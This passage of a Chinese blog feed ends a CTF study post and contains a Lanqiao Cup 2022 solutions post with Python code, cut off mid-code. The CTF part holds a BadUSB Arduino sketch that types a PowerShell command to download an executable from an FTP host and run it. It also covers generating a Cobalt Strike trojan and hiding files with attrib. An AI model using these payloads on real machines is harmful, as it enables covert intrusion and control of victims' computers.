class="keyword">define</span> KEY_RETURN      0xB0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KEY_ESC       0xB1</span></span><br><span class="line"><span class="comment">///特殊键位，我比较常用的是DELETE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KEY_INSERT      0xD1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KEY_DELETE      0xD4</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KEY_PAGE_UP     0xD3</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KEY_PAGE_DOWN   0xD6</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KEY_HOME      0xD2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KEY_END       0xD5</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KEY_CAPS_LOCK   0xC1</span></span><br><span class="line"><span class="comment">///F区的这些那些</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KEY_F1        0xC2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KEY_F2        0xC3</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KEY_F3        0xC4</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KEY_F4        0xC5</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KEY_F5        0xC6</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KEY_F6        0xC7</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KEY_F7        0xC8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KEY_F8        0xC9</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KEY_F9        0xCA</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KEY_F10       0xCB</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KEY_F11       0xCC</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KEY_F12       0xCD</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KEY_F13       0xF0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KEY_F14       0xF1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KEY_F15       0xF2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KEY_F16       0xF3</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KEY_F17       0xF4</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KEY_F18       0xF5</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KEY_F19       0xF6</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KEY_F20       0xF7</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KEY_F21       0xF8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KEY_F22       0xF9</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KEY_F23       0xFA</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KEY_F24       0xFB</span></span><br></pre></td></tr></table></figure><h4 id="利用FTP服务器存储病毒文件，利用BadUSB执行下载命令后运行"><a href="#利用FTP服务器存储病毒文件，利用BadUSB执行下载命令后运行" class="headerlink" title="利用FTP服务器存储病毒文件，利用BadUSB执行下载命令后运行"></a>利用FTP服务器存储病毒文件，利用BadUSB执行下载命令后运行</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Keyboard.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">setup</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  Keyboard.<span class="built_in">begin</span>();</span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">2000</span>);</span><br><span class="line">  Keyboard.<span class="built_in">press</span>(KEY_LEFT_GUI);<span class="comment">//win键 </span></span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">500</span>); </span><br><span class="line">  Keyboard.<span class="built_in">press</span>(<span class="string">&#x27;r&#x27;</span>);<span class="comment">//r键 </span></span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">500</span>); </span><br><span class="line">  Keyboard.<span class="built_in">release</span>(KEY_LEFT_GUI); <span class="comment">//win键 释放</span></span><br><span class="line">  Keyboard.<span class="built_in">release</span>(<span class="string">&#x27;r&#x27;</span>); <span class="comment">//r键 释放</span></span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">500</span>);</span><br><span class="line">  Keyboard.<span class="built_in">println</span>(<span class="string">&quot;powershell $p=new-object system.net.webclient;$p.downloadfile(&#x27;FTP://admin:123456@169.254.202.247/calc.exe&#x27;,&#x27;F:\\calc.exe&#x27;);START F:\\calc.exe&quot;</span>);</span><br><span class="line">  Keyboard.<span class="built_in">end</span>();<span class="comment">//结束键盘通讯 </span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">loop</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>FTP协议写法：<code>ftp://&lt;username&gt;:&lt;password&gt;@&lt;address&gt;:&lt;port&gt;</code>，可以通过这种方式将用户名和命令写入而无需弹出验证窗口</li></ul><h3 id="CobaltStrike用法"><a href="#CobaltStrike用法" class="headerlink" title="CobaltStrike用法"></a>CobaltStrike用法</h3><p>首先需要打开Teamserver</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/CTF-in-College-2/%E7%AE%A1%E7%90%86%E5%91%98__%E8%8E%B7%E5%8F%96%E7%AE%A1%E7%90%86%E5%91%98%E6%9D%83%E9%99%90%20-%2020220416-164025.png"></p><p>然后再打开CS，连接Teamserver</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/CTF-in-College-2/Connect%20-%2020220416-164031.png"></p><p>接着就会弹出主界面</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/CTF-in-College-2/Cobalt_Strike%20-%2020220416-164039.png"></p><p>然后我们生成一个木马程序，这个程序运行后就会在主界面显示肉鸡，可以进行远程操作等操作</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/CTF-in-College-2/Windows_Executable%20-%2020220416-164049.png"></p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/CTF-in-College-2/Choose_a_payload_to_stage%20-%2020220416-164045.png"></p><h3 id="隐藏木马病毒"><a href="#隐藏木马病毒" class="headerlink" title="隐藏木马病毒"></a>隐藏木马病毒</h3><p>一般来说，木马下载到计算机内后，如果不隐藏很快就会被发现（这不是当然的嘛，一个不明觉厉的exe在那里谁都会感觉奇怪吧）</p><p>所以在Windows下，我们可以将文件进行隐藏，使用<code>attrib</code>命令就可以做到这一点，例如</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">attrib +s +<span class="built_in">h</span> <span class="string">&#x27;.\Virus.exe&#x27;</span></span><br></pre></td></tr></table></figure><p>隐藏后可以用命令行打开（直接输入<code>.\Virus.exe</code>就行了），但是在文件资源管理器里面看不到</p><p>在Linux下，可以在文件的最前面加一个点（<code>.</code>），会被Linux认为是隐藏文件，就在文件管理器中看不到啦</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>蓝桥杯2022年B组省赛 —— 个人题解</title>
      <link href="/posts/lanqiao-2022-province/"/>
      <url>/posts/lanqiao-2022-province/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p>这篇是后来补发的，过了老久才想起来我的蓝桥杯题解还没发出来，所以这里补一份</p></blockquote><h2 id="试题-A-排列字母"><a href="#试题-A-排列字母" class="headerlink" title="试题 A: 排列字母"></a>试题 A: 排列字母</h2><p>本题总分：5 分 </p><ul><li>【问题描述】 小蓝要把一个字符串中的字母按其在字母表中的顺序排列。 例如，LANQIAO 排列后为 AAILNOQ。 又如，GOODGOODSTUDYDAYDAYUP 排列后为 AADDDDDGGOOOOPSTUUYYY 。 请问对于以下字符串，排列之后字符串是什么？ WHERETHEREISAWILLTHEREISAWAY </li><li>【答案提交】 这是一道结果填空的题，你只需要算出结果后提交即可。本题的结果为一 个由大写字母组成的字符串，在提交答案时只填写这个字符串，填写多余的内 容将无法得分。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 忘存代码了</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;I forgot to save the code...&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="试题-B-寻找整数"><a href="#试题-B-寻找整数" class="headerlink" title="试题 B: 寻找整数"></a>试题 B: 寻找整数</h2><p>本题总分：5 分 </p><ul><li><p>【问题描述】 有一个不超过 1017 的正整数 n，知道这个数除以 2 至 49 后的余数如下表 所示，求这个正整数最小是多少。</p></li><li><p><img src="https://cdn.bilicdn.tk/gh/Vikutorika/newassets@master/img/lanqiao-2022-Province/msedge-20221105-113347.png"></p></li><li><p>【答案提交】 这是一道结果填空的题，你只需要算出结果后提交即可。本题的结果为一 个整数，在提交答案时只填写这个整数，填写多余的内容将无法得分。</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">equal = <span class="literal">True</span></span><br><span class="line">result = <span class="literal">False</span></span><br><span class="line">mods = &#123;</span><br><span class="line">    <span class="number">2</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="number">3</span>: <span class="number">2</span>,</span><br><span class="line">    <span class="number">4</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="number">5</span>: <span class="number">4</span>,</span><br><span class="line">    <span class="number">6</span>: <span class="number">5</span>,</span><br><span class="line">    <span class="number">7</span>: <span class="number">4</span>,</span><br><span class="line">    <span class="number">8</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="number">9</span>: <span class="number">2</span>,</span><br><span class="line">    <span class="number">10</span>: <span class="number">9</span>,</span><br><span class="line">    <span class="number">11</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="number">12</span>: <span class="number">5</span>,</span><br><span class="line">    <span class="number">13</span>: <span class="number">10</span>,</span><br><span class="line">    <span class="number">14</span>: <span class="number">11</span>,</span><br><span class="line">    <span class="number">15</span>: <span class="number">14</span>,</span><br><span class="line">    <span class="number">16</span>: <span class="number">9</span>,</span><br><span class="line">    <span class="number">17</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="number">18</span>: <span class="number">11</span>,</span><br><span class="line">    <span class="number">19</span>: <span class="number">18</span>,</span><br><span class="line">    <span class="number">20</span>: <span class="number">9</span>,</span><br><span class="line">    <span class="number">21</span>: <span class="number">11</span>,</span><br><span class="line">    <span class="number">22</span>: <span class="number">11</span>,</span><br><span class="line">    <span class="number">23</span>: <span class="number">15</span>,</span><br><span class="line">    <span class="number">24</span>: <span class="number">17</span>,</span><br><span class="line">    <span class="number">25</span>: <span class="number">9</span>,</span><br><span class="line">    <span class="number">26</span>: <span class="number">23</span>,</span><br><span class="line">    <span class="number">27</span>: <span class="number">20</span>,</span><br><span class="line">    <span class="number">28</span>: <span class="number">25</span>,</span><br><span class="line">    <span class="number">29</span>: <span class="number">16</span>,</span><br><span class="line">    <span class="number">30</span>: <span class="number">29</span>,</span><br><span class="line">    <span class="number">31</span>: <span class="number">27</span>,</span><br><span class="line">    <span class="number">32</span>: <span class="number">25</span>,</span><br><span class="line">    <span class="number">33</span>: <span class="number">11</span>,</span><br><span class="line">    <span class="number">34</span>: <span class="number">17</span>,</span><br><span class="line">    <span class="number">35</span>: <span class="number">4</span>,</span><br><span class="line">    <span class="number">36</span>: <span class="number">29</span>,</span><br><span class="line">    <span class="number">37</span>: <span class="number">22</span>,</span><br><span class="line">    <span class="number">38</span>: <span class="number">37</span>,</span><br><span class="line">    <span class="number">39</span>: <span class="number">23</span>,</span><br><span class="line">    <span class="number">40</span>: <span class="number">9</span>,</span><br><span class="line">    <span class="number">41</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="number">42</span>: <span class="number">11</span>,</span><br><span class="line">    <span class="number">43</span>: <span class="number">11</span>,</span><br><span class="line">    <span class="number">44</span>: <span class="number">33</span>,</span><br><span class="line">    <span class="number">45</span>: <span class="number">29</span>,</span><br><span class="line">    <span class="number">46</span>: <span class="number">15</span>,</span><br><span class="line">    <span class="number">47</span>: <span class="number">5</span>,</span><br><span class="line">    <span class="number">48</span>: <span class="number">41</span>,</span><br><span class="line">    <span class="number">49</span>: <span class="number">46</span></span><br><span class="line">    &#125;</span><br><span class="line">i = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> i &lt;= <span class="number">10</span>**<span class="number">17</span>:</span><br><span class="line">    i *= <span class="number">11</span></span><br><span class="line">    equal = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,<span class="number">50</span>):</span><br><span class="line">        <span class="keyword">if</span> i % j != mods[j]:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;i&#125;</span> % <span class="subst">&#123;j&#125;</span> = <span class="subst">&#123;i%j&#125;</span> != <span class="subst">&#123;mods[j]&#125;</span>&#x27;</span>)</span><br><span class="line">            equal = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> equal:</span><br><span class="line">        num = i</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> equal: <span class="built_in">print</span>(<span class="string">f&#x27;result: <span class="subst">&#123;num&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>: <span class="built_in">print</span>(<span class="string">&#x27;No Result&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="试题-C-纸张尺寸"><a href="#试题-C-纸张尺寸" class="headerlink" title="试题 C: 纸张尺寸"></a>试题 C: 纸张尺寸</h2><ul><li><p>时间限制：1.0s</p></li><li><p>内存限制：512.0MB</p></li><li><p>本题总分：10分</p></li><li><p>【问题描述】<br>在ISO国际标准中定义了A0纸张的大小为1189mm×841mm，将A0纸沿长边对折后为A1纸，大小为841mm×5mm，在对折的过程中长度直接取下整（实际裁剪时可能有损耗）。将A1纸沿长边对折后为A2纸，依此类推。输入纸张的名称，请输出纸张的大小。</p></li><li><p>【输入格式】<br>输入一行包含一个字符串表示纸张的名称，该名称一定是A3、A4、A5、A6、A7、A8、A9之一</p></li><li><p>【输出格式】<br>输出两行，每行包含一个整数，依次表示长边和短边的长度。</p></li><li><p>【样例输入1】<br>A0</p></li><li><p>【样例输出1】<br>1189<br>841</p></li><li><p>【样例输入2】<br>A1</p></li><li><p>【样例输出2】<br>841<br>594</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">line = <span class="number">1189</span></span><br><span class="line">col = <span class="number">841</span></span><br><span class="line">size = <span class="built_in">input</span>()</span><br><span class="line">times = <span class="built_in">int</span>(size[<span class="number">1</span>:])</span><br><span class="line"><span class="built_in">print</span>(times)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(times):</span><br><span class="line">    <span class="keyword">if</span> line &gt;= col: line = line // <span class="number">2</span></span><br><span class="line">    <span class="keyword">else</span>: col = col // <span class="number">2</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">max</span>([line,col]))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">min</span>([line,col]))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="试题-D-数位排序"><a href="#试题-D-数位排序" class="headerlink" title="试题 D: 数位排序"></a>试题 D: 数位排序</h2><ul><li>时间限制：1.0s</li><li>内存限制：512MB</li><li>本题总分：10分</li><li>【问题描述】<br>小蓝对一个数的数位之和很感兴趣，今天他要按照数位之和给数排序。当两个数各个数位之和不同时，将数位和较小的排在前而，当数位之和相等时，将数值小的排在前。例如，2022排在409前面，因为2022的数位之和是6，小于409的数位之和13。<br>又如，6排在2022前，因为它们的数位之和相同，而6小于2022。<br>给定正整数n，m，请问对1到n采用这种方法排序时，排在第m个的元素是多少？</li><li>【输入格式】<br>输入第一行包含一个正整数n。第二行包含一个正整数m。</li><li>【输出格式】<br>输出一行包含一个整数，表示答案。</li><li>【样例输入】<br>13<br>5</li><li>【样例输出】<br>3</li><li>【样例说明】<br> 1 到 13 的排序为：1, 10, 2, 11, 3, 12, 4, 13, 5, 6, 7, 8, 9。第 5 个数为 3。</li><li>【评测用例规模与约定】<br>  对于 30% 的评测用例，1 ≤ m ≤ n ≤ 300。 对于 50% 的评测用例，1 ≤ m ≤ n ≤ 1000。 对于所有评测用例，1 ≤ m ≤ n ≤ 106。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">maxnum = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">pos = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">summary</span>(<span class="params">num</span>):</span><br><span class="line">    length = <span class="built_in">len</span>(<span class="built_in">str</span>(num))</span><br><span class="line">    s = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">str</span>(num):</span><br><span class="line">        s += <span class="built_in">int</span>(i)</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line">nums = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,maxnum+<span class="number">1</span>):</span><br><span class="line">    nums.append((i,summary(i)))</span><br><span class="line">nums.sort(key=<span class="keyword">lambda</span> s: s[<span class="number">0</span>])</span><br><span class="line">nums.sort(key=<span class="keyword">lambda</span> s: s[<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(nums[pos-<span class="number">1</span>][<span class="number">0</span>])</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="试题-E-蜂巢"><a href="#试题-E-蜂巢" class="headerlink" title="试题 E: 蜂巢"></a>试题 E: 蜂巢</h2><ul><li>时间限制: 1.0s </li><li>内存限制: 512.0MB </li><li>本题总分：15 分</li><li>【问题描述】<br>蜂巢由大量的六边形拼接而成，定义蜂巢中的方向为：0 表示正西方向，1表示西偏北 60◦，2 表示东偏北 60◦，3 表示正东，4 表示东偏南 60◦，5 表示西<br>偏南 60◦。对于给定的一点 O，我们以 O 为原点定义坐标系，如果一个点 A 由 O 点先向 d 方向走 p 步再向 (d + 2) mod 6 方向（d 的顺时针 120◦ 方向）走 q 步到达，则这个点的坐标定义为 (d, p, q)。在蜂窝中，一个点的坐标可能有多种。下图给出了点 B(0, 5, 3) 和点 C(2, 3, 2) 的示意。<br><img src="https://cdn.bilicdn.tk/gh/Vikutorika/newassets@master/img/lanqiao-2022-Province/msedge-20221108-195641.png"><br>给定点 (d1, p1, q1) 和点 (d2, p2, q2)，请问他们之间最少走多少步可以到达？</li><li>【输入格式】<br>输入一行包含 6 个整数 d1, p1, q1, d2, p2, q2 表示两个点的坐标，相邻两个整数之间使用一个空格分隔。</li><li>【输出格式】<br>输出一行包含一个整数表示两点之间最少走多少步可以到达。</li><li>【样例输入】<br>0 5 3 2 3 2</li><li>【样例输出】<br>7</li><li>【评测用例规模与约定】<br>对于 25% 的评测用例，p1, p2 ≤ 103 ；<br>对于 50% 的评测用例，p1, p2 ≤ 105 ；<br>对于 75% 的评测用例，p1, p2 ≤ 107 ；<br>对于所有评测用例，0 ≤ d1, d2 ≤ 5，0 ≤ q1 &lt; p1 ≤ 109，0 ≤ q2 &lt; p2 ≤ 109 。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;没做出来……&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="试题-F-消除游戏"><a href="#试题-F-消除游戏" class="headerlink" title="试题 F: 消除游戏"></a>试题 F: 消除游戏</h2><ul><li>时间限制: 3.0s </li><li>内存限制: 512.0MB </li><li>本题总分：15 分 </li><li>【问题描述】 在一个字符串 S 中，如果 S i &#x3D; S i−1 且 S i , S i+1 ，则称 S i 和 S i+1 为边缘字符。如果 S i , S i−1 且 S i &#x3D; S i+1，则 S i−1 和 S i 也称为边缘字符。其它的字符都不是边缘字符。 对于一个给定的串 S，一次操作可以一次性删除该串中的所有边缘字符 （操作后可能产生新的边缘字符）。 请问经过 2 64 次操作后，字符串 S 变成了怎样的字符串，如果结果为空则 输出 EMPTY。 </li><li>【输入格式】<br> 输入一行包含一个字符串 S 。 </li><li>【输出格式】<br> 输出一行包含一个字符串表示答案，如果结果为空则输出 EMPTY。 </li><li>【样例输入 1】<br> edda </li><li>【样例输出 1】<br>EMPTY </li><li>【样例输入 2】<br>sdfhhhhcvhhxcxnnnnshh </li><li>【样例输出 2】<br> s</li><li>【评测用例规模与约定】<br>对于 25% 的评测用例，|S | ≤ 103 ，其中 |S | 表示 S 的长度；<br>对于 50% 的评测用例，|S | ≤ 104 ；<br>对于 75% 的评测用例，|S | ≤ 105 ；<br>对于所有评测用例，|S | ≤ 106，S 中仅含小写字母。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="built_in">input</span>()</span><br><span class="line">times = <span class="number">2</span>**<span class="number">64</span></span><br><span class="line">mark = <span class="string">&#x27;F&#x27;</span>*<span class="built_in">len</span>(s)</span><br><span class="line">nextS = <span class="string">&#x27;&#x27;</span></span><br><span class="line">empty = <span class="literal">False</span></span><br><span class="line">NoOperation = <span class="literal">True</span></span><br><span class="line"><span class="keyword">for</span> time <span class="keyword">in</span> <span class="built_in">range</span>(times):</span><br><span class="line">    <span class="keyword">if</span> s == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        empty = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">        <span class="keyword">if</span> i == (<span class="built_in">len</span>(s)-<span class="number">1</span>): <span class="keyword">continue</span>    </span><br><span class="line">        <span class="keyword">if</span> s[i] == s[i+<span class="number">1</span>] <span class="keyword">and</span> s[i] != s[i-<span class="number">1</span>]:   <span class="comment"># 与右边相同与左边不同</span></span><br><span class="line">            NoOperation = <span class="literal">False</span></span><br><span class="line">            mark = mark[:i-<span class="number">1</span>] + <span class="string">&#x27;TT&#x27;</span> + mark[i+<span class="number">1</span>:]</span><br><span class="line">        <span class="keyword">elif</span> s[i] == s[i-<span class="number">1</span>] <span class="keyword">and</span> s[i] != s[i+<span class="number">1</span>]:    <span class="comment"># 与左边相同与右边不同</span></span><br><span class="line">            NoOperation = <span class="literal">False</span></span><br><span class="line">            mark = mark[:i] + <span class="string">&#x27;TT&#x27;</span> + mark[i+<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">if</span> NoOperation: <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(mark)):</span><br><span class="line">        <span class="keyword">if</span> mark[i] == <span class="string">&#x27;F&#x27;</span>:</span><br><span class="line">            nextS += s[i]</span><br><span class="line">    s = nextS</span><br><span class="line">    nextS = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    mark = <span class="string">&#x27;F&#x27;</span>*<span class="built_in">len</span>(s)</span><br><span class="line">    NoOperation = <span class="literal">True</span></span><br><span class="line"><span class="keyword">if</span> empty:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;EMPTY&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(s)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="试题-G-全排列的价值"><a href="#试题-G-全排列的价值" class="headerlink" title="试题 G: 全排列的价值"></a>试题 G: 全排列的价值</h2><ul><li>时间限制: 1.0s </li><li>内存限制: 512.0MB </li><li>本题总分：20 分 </li><li>【问题描述】<br> 对于一个排列 A &#x3D; (a1, a2, · · · , an)，定义价值 ci 为 a1 至 ai−1 中小于 ai 的数 的个数，即 bi &#x3D; |{aj | j &lt; i, aj &lt; ai}|。定义 A 的价值为 ∑n i&#x3D;1 ci。 给定 n，求 1 至 n 的全排列中所有排列的价值之和。 </li><li>【输入格式】<br> 输入一行包含一个整数 n 。 </li><li>【输出格式】<br> 输出一行包含一个整数表示答案，由于所有排列的价值之和可能很大，请输出这个数除以 998244353 的余数。 </li><li>【样例输入 1】<br> 3 </li><li>【样例输出 1】<br> 9 </li><li>【样例输入 2】<br>2022 </li><li>【样例输出 2】<br> 593300958 </li><li>【样例说明】<br> 1 至 3 构成的所有排列的价值如下:<br>(1, 2, 3) : 0 + 1 + 2 &#x3D; 3 ；<br>(1, 3, 2) : 0 + 1 + 1 &#x3D; 2 ；<br>(2, 1, 3) : 0 + 0 + 2 &#x3D; 2 ；<br>(2, 3, 1) : 0 + 1 + 0 &#x3D; 1 ；<br>(3, 1, 2) : 0 + 0 + 1 &#x3D; 1 ；<br>(3, 2, 1) : 0 + 0 + 0 &#x3D; 0 ；<br>故总和为 3 + 2 + 2 + 1 + 1 &#x3D; 9。</li><li>【评测用例规模与约定】<br>  对于 40% 的评测用例，n ≤ 20 ；<br>  对于 70% 的评测用例，n ≤ 5000 ；<br>  对于所有评测用例，2 ≤ n ≤ 106 。</li></ul><blockquote><p><strong>这题没做完</strong></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td 